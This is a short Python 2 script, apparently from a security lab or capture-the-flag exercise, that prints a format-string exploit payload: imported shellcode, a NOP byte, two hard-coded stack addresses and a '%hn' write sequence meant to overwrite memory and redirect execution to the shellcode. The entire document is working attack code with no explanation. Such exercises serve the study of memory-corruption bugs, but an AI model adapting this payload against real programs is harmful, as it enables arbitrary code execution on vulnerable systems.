from shellcode import shellcode
from struct import pack



print shellcode+'\x90'+pack("<I", 0xbffea46c)+pack("<I", 0xbffea46e)+"%40000x%10$hn%9118x%11$hn"
